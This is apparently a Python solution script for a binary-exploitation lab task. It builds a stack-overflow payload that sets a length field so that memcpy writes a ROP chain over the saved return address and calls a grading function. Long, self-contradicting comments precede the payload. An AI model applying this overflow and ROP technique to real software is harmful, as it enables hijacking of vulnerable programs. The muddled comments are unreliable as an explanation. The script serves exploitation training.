#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log.

TODO: replace the empty payload with the bytes required by the lab.
"""
import struct
import sys

p64 = lambda v: struct.pack("<Q", v)
import struct as _s

# exploit: use memcpy to overwrite f.len, then gets to overwrite far past
# strategy: two-stage. But payload is one stdin, so we do it in one shot:
# - first N bytes fill expression; memcpy copies N bytes to logMsg (which starts at rbp-0xA0)
# - expression has 128 bytes; anything past 128 goes into logMsg (which IS memcpy dst)
# - f.len is at rbp-0x20 which is inside logMsg (offset 0x80..0x84)
# - memcpy writes expression[0x80..0x84] -> logMsg+0x80 = f.len
# so: bytes[0x80:0x84] = big value for f.len, then memcpy will copy that to f.len
# but memcpy runs AFTER gets returns, so we can't overflow past 128
# instead: f.len starts 0, memcpy copies 128 bytes into logMsg
# since logMsg overlaps expression[128:256], we can overflow past that
# to saved_rip at offset 296
# canary is at rbp-0x8, offset 280..288
# fill 280 bytes junk, then write original canary value (unknown), skip via re-entry
# better: put ROP chain AFTER canary, but we can't know canary
# the task likely expects: overwrite f.len via memcpy to HUGE value,
# then memcpy will write 128 bytes to logMsg + HUGE -> into libc/stack
# but that's a write primitive, not a control-flow hijack
# given constraint, simplest: overwrite f.len = huge, then memcpy writes
# 128 bytes far past stack, likely crashing. Not grade_eval
# The realistic attack: f.len is at rbp-0x20 = offset 256..260 in expression
# memcpy copies expression[0x80..0x84] (at offset 128..132 of user input)
# to logMsg+0x80 which IS f.len (offset 256 in stack)
# So: bytes 128..132 of user input become f.len value!
# Set f.len = huge so memcpy writes far past stack. But then we lose control
# better: f.len = 0 → memcpy writes 128 bytes at logMsg[0..128] (harmless)
# we need f.len > 0 to shift memcpy dst, then get 128 bytes written past f.len
# if f.len = 264, memcpy writes to logMsg+264 = saved_rip area!
# and the content written = expression[0:128] which we control
# but memcpy size is 128, and it runs AFTER gets
# so plan: gets writes 256+128 = 384 bytes into stack (overflows)
# bytes[128:132] = 264 (little endian int) → this becomes f.len
# then memcpy writes 128 bytes from expression[0:128] to logMsg+264 = saved_rip
# so first 128 bytes = shellcode/ROP chain ending with grade_eval(4)
POP_RDI_RET = 0x4018A3
RET = 0x4018A5
grade_eval = 0x401677

gadget_chain = (
    p64(RET)
    + p64(POP_RDI_RET)
    + p64(4)
    + p64(grade_eval)
)

payload = (
    gadget_chain.ljust(128, b"\x90")   # memcpy source, written to saved_rip
    + _s.pack("<I", 264)               # bytes 128..132 = f.len after memcpy
    + b"A" * (288 - 132)
    + b"B" * 8                          # canary placeholder (overwritten by memcpy)
)

sys.stdout.buffer.write(payload)
